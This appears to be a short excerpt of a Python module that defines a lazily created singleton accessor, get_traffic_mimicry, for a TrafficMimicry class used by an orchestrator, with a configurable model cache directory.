# Singleton instance for use across the orchestrator
_default_instance: Optional[TrafficMimicry] = None


def get_traffic_mimicry(cache_dir: str = "") -> TrafficMimicry:
    """Get or create the singleton TrafficMimicry instance."""
    global _default_instance
    if _default_instance is None:
        _default_instance = TrafficMimicry(model_cache_dir=cache_dir)
    return _default_instance
